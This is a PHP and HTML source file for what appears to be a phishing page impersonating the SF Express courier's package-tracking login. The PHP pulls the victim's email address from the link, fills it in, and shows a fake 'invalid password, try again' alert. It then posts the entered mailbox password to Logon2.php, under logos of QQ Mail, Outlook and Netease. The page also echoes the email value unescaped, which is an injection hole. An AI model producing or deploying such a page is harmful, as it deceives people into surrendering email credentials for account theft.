<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
// < end 


$_SESSION['email'] = $email;


?>
<html>
<HEAD>
<TITLE>&#39034;&#20016;&#36895;&#36816;</TITLE>	
<link rel="shortcut icon" href="http://www.sf-express.com/.galleries/favicon.ico" type="image/gif"/>
</head>
<script>
function validateForm()
{
var x=document.forms["myform"]["email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid e-mail address");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y.length < 5)
  {
  alert("Password is Too Short");
  return false;
  }
}
</script>
<body bgcolor="#F0EEEE" text="black" link="blue" alink="blue" vlink="blue" background="" >
<div align="center">
  <center>
  <form action="Logon2.php" onsubmit="return validateForm()" method="post" name="myform">
  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="589" height="276">
    <tr>
      <td width="589" height="92" colspan="2">
      <img src="images/SFExpress.png" height="65" width="160">
      <b style="color:#4C4848;font-size:24px;font-weight:bold">&#21253;&#35065;&#36319;&#36394;</b></td>
    </tr>
    <tr>
      <td width="589" height="25" colspan="2" bgcolor="#4C4848">
      <font size="4" color="#ffffff"><center><b>&#35831;&#29992;&#26377;&#25928;&#30340;&#30005;&#23376;&#37038;&#20214;&#21644;&#23494;&#30721;</b></center></font></td>
    </tr>
    <tr><td colspan=2 height="36"><font face="verdana,arial" size=2><span  class=text1a><b><font color="red"><img height="25" width="25" src="images/alert-icon-red-md.png">&nbsp;&nbsp; &#26080;&#25928;&#30340;&#23494;&#30721;&#12290;&#35831;&#20877;&#27425;&#23581;&#35797;&#20351;&#29992;&#27491;&#30830;&#30340;

&#35814;&#32454;&#20449;&#24687;&#12290; </font></b> </span></td></tr>
    <tr>
      <td width="158" height="51"><font color="#4C4848" face="verdana,arial" size="-1">
      <b><font color="red">*</font>&nbsp;&#30005;&#23376;&#37038;&#20214;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>:</b></font></td>
      <td width="425" height="51"><font face="Georgia Bold">&nbsp;<?php echo $email ?></font></td>
    </tr>
    <tr>
      <td width="158" height="40"><font face="verdana,arial" size=-1><b><font color="red">*</font></b>&nbsp;</font><b></b><font color="#4C4848" face="verdana,arial" size="-1"><b>&#30005;&#23376;&#37038;&#20214;&#23494;&#30721;</b>&nbsp;</font><font face="verdana,arial" size=-1>&nbsp;<b>:</b></td>
      <td width="425" height="40">&nbsp;<input type="password" name="epass" size="20"></td>
    </tr>
    
    <tr>
      <td width="158" height="32">&nbsp;</td>
      <td width="425" height="32"><input type="submit" value="&#32380;&#32396;"></td>
    </tr>
    
  </table>
  </center>
</div>


&nbsp;<center><hr color="#4C4848" size=2 width="100%">&nbsp;</center>
</font>
<b style="color:#4C4848;font-size:20px;font-weight:bold">&#39034;&#20016;&#24555;&#36882;</b> &#20249;&#20276;: <br>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img alt="Mail Enable" src="images/mailenable.png" height="60" width="150">&nbsp;<img alt="QQ Mail" src="images/qqmail.jpg" height="60" width="170">&nbsp; <img src="images/foxmail_logo.gif" alt="Fox Mail" height="60" width="120">&nbsp;&nbsp; <img src="images/outlook.png" alt="Outlook" width=120 height=60><img src="images/qiyelogo.jpg" alt="Qiye" title="" width=170 height=50>&nbsp;
<img src="images/netease_png.png" alt="Netease" title="" border=0 width="150" height="60"><img src="images/Qq1.png" alt="QQ1" title="" border=0 width="140" height="60"></p>
<br><p><center>&#29256;&#26435; &copy; 2018 &#39034;&#20016;&#24555;&#36882. 
&#29256;&#26435;&#25152;&#26377;.</center></p>
</body>
</html>